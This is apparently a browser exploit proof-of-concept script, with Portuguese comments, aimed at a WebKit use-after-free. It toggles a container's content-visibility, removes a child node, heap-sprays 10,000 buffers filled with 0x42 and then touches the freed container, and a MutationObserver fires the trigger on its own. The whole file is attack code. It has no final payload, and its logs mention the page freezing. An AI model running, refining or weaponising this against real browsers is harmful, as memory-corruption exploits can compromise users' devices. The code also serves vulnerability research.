// js/uaf_webkit_poc/poc.js
import { debug_log } from './module/utils.mjs';

let uafCoreLogicHasRun = false;

function heapSpray() {
  let spray = [];
  const sprayIterations = 10000; 
  const sprayPatternQWORD = [0x42, 0x42, 0x42, 0x42, 0x42, 0x42, 0x42, 0x42]; 
  
  // Este log pode não aparecer se o congelamento começar durante o spray
  // console.log(`[POC CONSOLE] Iniciando heapSpray com ${sprayIterations} iterações...`);
  // debug_log(`Iniciando heapSpray AGRESSIVO com ${sprayIterations} iterações e padrão QWORD [0x42...]...`);

  for (let i = 0; i < sprayIterations; i++) {
    let arr = new Uint8Array(0x1000);
    for (let j = 0; j < arr.length; j++) {
      arr[j] = sprayPatternQWORD[j % sprayPatternQWORD.length];
    }
    spray.push(arr);
  }
  // console.log(`[POC CONSOLE] heapSpray concluído.`);
  return spray;
}

export function triggerUAF() {
  // console.log("[POC CONSOLE] triggerUAF: Início da função.");
  const currentContainer = document.querySelector(".container");

  if (!currentContainer) {
    debug_log("Erro Crítico: Elemento .container não encontrado para UAF.");
    return;
  }
  // console.log("[POC CONSOLE] triggerUAF: .container encontrado.");

  if (uafCoreLogicHasRun && document.getElementById('runUAFBtn') && document.getElementById('runUAFBtn').disabled) {
    debug_log("UAF já foi tentado. Recarregue a página para um novo teste completo.");
    return;
  }
  // console.log("[POC CONSOLE] triggerUAF: Verificação uafCoreLogicHasRun passou.");

  const currentChild = currentContainer.querySelector(".child");
  // console.log(`[POC CONSOLE] triggerUAF: .child ${currentChild ? 'encontrado' : 'NÃO encontrado'}.`);

  debug_log("Iniciando UAF: contentVisibility=hidden...");
  currentContainer.style.contentVisibility = "hidden";
  // console.log("[POC CONSOLE] triggerUAF: contentVisibility definido para 'hidden'.");

  if (currentChild) {
    debug_log("Elemento .child encontrado, removendo-o.");
    // console.log("[POC CONSOLE] triggerUAF: Removendo .child...");
    currentChild.remove();
    // console.log("[POC CONSOLE] triggerUAF: .child removido.");
  } else {
    debug_log("Elemento .child já foi removido ou não encontrado inicialmente.");
    // console.log("[POC CONSOLE] triggerUAF: .child não encontrado para remoção (já removido?).");
  }

  uafCoreLogicHasRun = true; 
  const uafButton = document.getElementById('runUAFBtn');
  if(uafButton) {
      uafButton.disabled = true;
      debug_log("Botão de UAF desabilitado. Recarregue para um novo teste completo.");
      // console.log("[POC CONSOLE] triggerUAF: Botão UAF desabilitado.");
  }

  // console.log("[POC CONSOLE] triggerUAF: Agendando setTimeout...");
  setTimeout(() => {
    // console.log("[POC CONSOLE] setTimeout callback: Início.");
    debug_log("setTimeout: contentVisibility=auto, heapSpray()...");
    
    if (document.body.contains(currentContainer)) {
        // console.log("[POC CONSOLE] setTimeout: Definindo currentContainer.style.contentVisibility = 'auto'");
        currentContainer.style.contentVisibility = "auto";
        // console.log("[POC CONSOLE] setTimeout: contentVisibility definido para 'auto'.");
    } else {
        debug_log("Container foi removido do DOM antes de contentVisibility='auto'.");
        return;
    }
    
    debug_log(`Iniciando heapSpray com 10000 iterações (padrão QWORD [0x42...])...`);
    let sprayArrays = heapSpray(); 
    if(sprayArrays.length > 0) {
        debug_log(`Heap spray realizado com ${sprayArrays.length} arrays.`);
    }
    debug_log("Heap spray concluído.");
    
    // PONTO CRÍTICO DE TESTE APÓS UAF E SPRAY
    // Se o congelamento ocorre antes daqui, esta seção pode não ser alcançada ou seus logs podem ser atrasados.
    debug_log("Tentando interação MÍNIMA com o container pós-spray...");
    try {
        // Operação 1: Forçar um re-cálculo de layout/estilo lendo uma propriedade.
        // Esta é uma operação comum que interage com o estado de renderização.
        debug_log("  Lendo currentContainer.offsetHeight...");
        let h = currentContainer.offsetHeight; // Força o cálculo do layout
        debug_log(`  currentContainer.offsetHeight lido: ${h}.`);

        // Operação 2: Tentar uma modificação de atributo simples.
        debug_log("  Definindo currentContainer.setAttribute('data-uaf-test', 'hit')...");
        currentContainer.setAttribute('data-uaf-test', 'hit');
        if (currentContainer.getAttribute('data-uaf-test') === 'hit') {
            debug_log("  Atributo 'data-uaf-test' definido e verificado com sucesso.");
        } else {
            debug_log("  FALHA ao definir/verificar atributo 'data-uaf-test'.");
        }
        
        debug_log("Interação MÍNIMA com o container concluída SEM ERRO JAVASCRIPT.");

    } catch (e) {
        debug_log(`ERRO JAVASCRIPT durante interação mínima com container: ${e.name} - ${e.message}`);
        console.error("[POC CONSOLE] Erro interação mínima:", e);
    }
    debug_log("Fim da lógica do setTimeout.");

  }, 0); // setTimeout
  // console.log("[POC CONSOLE] triggerUAF: setTimeout agendado. Fim da função principal.");
}

// Configuração do MutationObserver
const initialContainerForObserver = document.querySelector(".container");
if (initialContainerForObserver) {
    const observer = new MutationObserver((mutationsList, obs) => {
      if (!uafCoreLogicHasRun) { 
        // console.log("[POC CONSOLE] MutationObserver: Acionado, chamando triggerUAF...");
        debug_log("MutationObserver: DOM tree modified, chamando triggerUAF (primeira vez via observer)...");
        triggerUAF();
        obs.disconnect(); 
        debug_log("MutationObserver desconectado.");
        // console.log("[POC CONSOLE] MutationObserver: Desconectado.");
      } else {
        // console.log("[POC CONSOLE] MutationObserver: Acionado, mas UAF já rodou. Desconectando.");
        obs.disconnect(); 
      }
    });
    observer.observe(initialContainerForObserver, { childList: true, subtree: true });
    // console.log("[POC CONSOLE] MutationObserver configurado.");
} else {
    // console.warn("[POC CONSOLE] Elemento .container inicial não encontrado para MutationObserver.");
}
